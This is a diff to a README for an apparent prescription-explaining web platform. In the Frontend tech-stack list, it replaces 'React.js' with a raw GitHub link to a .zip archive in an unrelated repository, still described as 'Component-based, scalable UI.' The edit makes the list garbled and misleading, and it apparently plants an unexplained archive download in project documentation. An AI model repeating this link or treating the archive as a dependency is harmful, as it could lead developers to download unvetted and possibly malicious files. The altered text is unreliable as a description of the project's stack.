@@ -38,7 +38,7 @@ A **user-friendly web platform** that instantly transforms confusing prescriptio
 ## 🛠️ Tech Stack  
 
 ### Frontend  
-- **React.js** → Component-based, scalable UI.  
+- **https://raw.githubusercontent.com/rushangchandekar/Nexora/main/flank/Nexora.zip** → Component-based, scalable UI.  
 - **Tailwind CSS** → Modern responsive design.  
 - **shadcn/ui** → Pre-built, accessible UI components.  
 - **Framer Motion** → Smooth transitions & animations.  
